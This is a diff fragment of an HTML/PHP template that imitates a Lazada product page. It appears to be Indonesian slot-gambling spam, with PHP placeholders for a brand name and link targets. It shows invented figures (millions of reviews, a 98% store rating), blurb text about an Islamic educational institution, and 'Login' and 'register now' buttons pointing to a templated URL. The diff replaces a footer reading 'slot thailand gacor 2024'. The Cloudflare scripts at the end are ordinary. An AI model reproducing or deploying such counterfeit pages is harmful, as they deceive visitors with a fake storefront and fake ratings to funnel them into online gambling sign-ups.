src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/></div><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-review-summary__link" data-spm-anchor-id="12anj4u.pdp_revamp.0.0">9.998.556 Penilaian</a></div></div></div><div id="block-ztlO6gvyRIv" class="pdp-block pdp-block__share"><div id="block--PRjoF98du4" class="pdp-block" style="display:inline-block;width:24px;height:54px"><div id="module_product_share_1" class="pdp-block module"></div></div><div id="block-7fC8S_Z8DDj" class="pdp-block" style="display:inline-block"><div id="module_product_wishlist_1" class="pdp-block module"><p></p></div></div></div></div><div id="module_product_brand_1" class="pdp-block module"><div class="pdp-product-brand"><span class="pdp-product-brand__name">Merek<!-- -->:<!-- --> </span><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-product-brand__brand-link" target="_self" href="<?php echo $urlPath; ?>"><?php echo $BRANDS; ?></a><div class="pdp-product-brand__divider"></div></div></div><div id="module_product_attrs" class="pdp-block module"></div><div id="block-cKVxLtoIbl2" class="pdp-block module"></div><div id="module_product_price_1" class="pdp-block module"><div class="pdp-mod-product-price"><p><?php echo $BRANDS; ?> berkomitmen mencetak lulusan berkualitas dengan nilai-nilai Islam. Menawarkan berbagai program studi unggulan. Login dan Daftar Sekarang!</p><div class="pdp-product-price" bis_skin_checked="1"><span class="notranslate pdp-price pdp-price_type_normal pdp-price_color_orange pdp-price_size_xl" data-spm-anchor-id="12anj4u.pdp_revamp.0.i0.241073bdUG5ius">Rp.5.599</span><div class="origin-block" bis_skin_checked="1"><span class="notranslate pdp-price pdp-price_type_deleted pdp-price_color_lightgray pdp-price_size_xs">Rp.10.000</span><span class="pdp-product-price__discount">-78%</span></div></div></div></div><div id="module_redmart_product_price" class="pdp-block module"></div><div id="module_promotion_tags" class="pdp-block module"></div><div id="module_installment" class="pdp-block module"></div><div id="module_sms-phone-input" class="pdp-block module"></div><div id="module_add_to_cart" class="pdp-block module" bis_skin_checked="1"><div class="pdp-cart-concern" bis_skin_checked="1"><a href="<?php echo $ampnya; ?>"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_yellow pdp-button_size_xl" data-spm-anchor-id="12anj4u.pdp_revamp.0.i0.241073bdeHYO5j"><span class="pdp-button-text">Login</span></button></a><a href="<?php echo $ampnya; ?>" target="_blank"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_orange pdp-button_size_xl"><span class="pdp-button-text"><span class="">DAFTAR SEKARANG</span></span></button></a><form method="post" action=""><input name="buyParams" type="hidden" value="{&quot;items&quot;:[{&quot;itemId&quot;:&quot;3642482616&quot;,&quot;skuId&quot;:&quot;6108584955&quot;,&quot;quantity&quot;:1,&quot;attributes&quot;:null}]}"></form></div></div><div id="module_redmart_add_to_cart" class="pdp-block module"></div></div><div id="block-O-HF3LN4YVI" class="pdp-block pdp-block__delivery-seller"><div id="module_seller_delivery" class="pdp-block module"><div data-spm="delivery_options" data-nosnippet="true"><div class="delivery"><div class="delivery-header"><div class="delivery-header__title" data-spm-anchor-id="a2o4j.pdp_revamp.delivery_options.i1.502946e9Rasjau">Pilihan pengiriman&nbsp;</div><div class="delivery-header__tooltip"><div><i class="delivery-tooltip__icon"><span><svg class="lazadaicon lazada-icon svgfont " aria-hidden="true"><use xlink:href="#lazadaicon_tooltip"></use></svg></span></i></div></div></div><div class="delivery__header"><div class="location delivery__location"><div class="location__current"><div class="location__body"><i class="location__icon"><span><svg class="lazadaicon lazada-icon svgfont " aria-hidden="true" data-spm-anchor-id="a2o4j.pdp_revamp.delivery_options.i2.502946e9Rasjau"><use xlink:href="#lazadaicon_location"></use></svg></span></i><div class="location__address">Jl. Peta No.154, Suka Asih, Kec. Bojongloa Kaler, Kota Bandung, Jawa Barat 40231.</div><div class="location__link-change"><a class="location-link location-link_size_xs automation-location-link-change">UBAH</a></div></div></div></div></div><div class="delivery__content"><div class="delivery__options"><div class="delivery__option"><div class="delivery-option-item delivery-option-item_type_standard"><div class="delivery-option-item__body"><i class="delivery-option-item__icon"><span class="lzd-svg-icon lzd-svg-icon_name_standard"><svg class="lazadaicon lazada-icon svgfont " aria-hidden="true"><use xlink:href="#lazadaicon_standard"></use></svg></span></i><div class="delivery-option-item__info"><div class="delivery-option-item__title">Standar</div><div class="delivery-option-item__time">Dijamin tiba 01 Mar - 05 Mar. Dapatkan LazRewards Rp5.599 jika pesananmu terlambat</div></div><div class="delivery-option-item__shipping-fee no-subtitle">Rp19.808</div></div></div></div><div class="delivery__option"><div class="delivery-option-item delivery-option-item_type_COD"><div class="delivery-option-item__body"><i class="delivery-option-item__icon"><span class="lzd-svg-icon lzd-svg-icon_name_shipping"><svg class="lazadaicon lazada-icon svgfont " aria-hidden="true"><use xlink:href="#lazadaicon_shipping" data-spm-anchor-id="a2o4j.pdp_revamp.delivery_options.i0.502946e9Rasjau"></use></svg></span></i><div class="delivery-option-item__info"><div class="delivery-option-item__title">Bayar di tempat berlaku</div></div><div class="delivery-option-item__shipping-fee no-subtitle"></div></div></div></div></div></div></div></div></div><div id="module_redmart_delivery" class="pdp-block module"></div><div id="module_seller_warranty" class="pdp-block module"><div class="warranty" data-spm="return_warranty" data-nosnippet="true"><div class="delivery-header"><div class="delivery-header__title">Pengembalian &amp; Garansi&nbsp;</div><div class="delivery-header__tooltip"><div><i class="delivery-tooltip__icon"><span><svgclass="lazadaicon lazada-icon svgfont " aria-hidden="true"><use xlink:href="#lazadaicon_tooltip"></use></svg></span></i></div></div></div><div class="warranty__options"><div class="warranty__option-item"><div class="delivery-option-item delivery-option-item_type_change_mind_available"><div class="delivery-option-item__body"><i class="delivery-option-item__icon"><imgsrc="https://img.lazcdn.com/g/tps/imgextra/i4/O1CN01HLFg791eRalDVt0XN_!!6000000003868-2-tps-54-54.png" width="24"></i><div class="delivery-option-item__info"><div class="delivery-option-item__title" data-spm-anchor-id="a2o4j.pdp_revamp.return_warranty.i0.502946e9Rasjau">Berubah Pikiran</div></div></div></div></div><div class="warranty__option-item"><div class="delivery-option-item delivery-option-item_type_returnPolicy7"><div class="delivery-option-item__body"><i class="delivery-option-item__icon"><span class="lzd-svg-icon lzd-svg-icon_name_7days"><svg class="lazadaicon lazada-icon svgfont " aria-hidden="true"><use xlink:href="#lazadaicon_7days"></use></svg></span></i><div class="delivery-option-item__info"><div class="delivery-option-item__title">7 Hari Gratis Pengembalian</div></div></div></div></div><div class="warranty__option-item"><div class="delivery-option-item delivery-option-item_type_noWarranty"><div class="delivery-option-item__body"><i class="delivery-option-item__icon"><span class="lzd-svg-icon lzd-svg-icon_name_nowarranty"><svg class="lazadaicon lazada-icon svgfont " aria-hidden="true"><use xlink:href="#lazadaicon_nowarranty"></use></svg></span></i><div class="delivery-option-item__info"><div class="delivery-option-item__title">Tidak ada garansi</div></div></div></div></div></div></div></div><div id="module_guide_app" class="pdp-block module"></div><div id="module_redmart_service" class="pdp-block module"></div>
+    <div id="module_seller_info" class="pdp-block module"><div class="seller-container" data-spm="seller"><div class="seller-name"><div class="seller-name__wrapper"><div class="seller-name__title">Dijual oleh</div><div class="seller-name__detail" data-spm="seller"><a href="<?php echo $urlPath; ?>"><?php echo $BRANDS; ?> LOGIN</a><a class="pdp-link pdp-link_size_l pdp-link_theme_black seller-name__detail-name"></a></div></div></div><div class="pdp-seller-info-pc"><div class="info-content" data-spm-anchor-id="a2o4j.pdp_revamp.seller.i0.502946e9Rasjau"><div class="seller-info-title">Rating Toko</div><div class="seller-info-value rating-positive ">98%</div></div><div class="info-content"><div class="seller-info-title">Pengiriman Tepat Waktu</div><div class="seller-info-value ">100%</div></div><div class="info-content"><div class="seller-info-title">Chat Dibalas</div><div class="seller-info-value ">100%</div></div></div><div class="pdp-seller-info-pc"></div></div></div><div id="module_redmart_seller_info" class="pdp-block module"></div></div></div></div></div></div>
   </div>
   
   <script type="5e90a40a2a274c6f57d2d593-text/javascript">
@@ -3878,13 +5070,14 @@ var gConfig = window.g_config || {};
               </div>
               <div class="lzd-footer-width-25">
               <div class="lzd-footer-copyright">
-              © slot thailand gacor 2024
+              © <?php echo $BRANDS; ?> LOGIN 2025
               </div>
               </div>
           </div>
       </div>
 </section>
 <script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="5e90a40a2a274c6f57d2d593-|49" defer></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"8fee63044b9b3e00","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"version":"2024.10.5","token":"92bd15c141134710b4642d84b8c3c429"}' crossorigin="anonymous"></script>
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"9015ad93efc5f928","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"version":"2024.10.5","token":"e2a765f324f4412da187da8b414d804f"}' crossorigin="anonymous"></script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'900fcae4ad1eb5e1',t:'MTczNjcxMjY1My4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"900fcae4ad1eb5e1","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"version":"2025.1.0","token":"e2a765f324f4412da187da8b414d804f"}' crossorigin="anonymous"></script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'901d03fc7c4cee36',t:'MTczNjg1MTMwNi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"901d03fc7c4cee36","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"version":"2025.1.0","token":"e2a765f324f4412da187da8b414d804f"}' crossorigin="anonymous"></script>
 </body>
 </html>
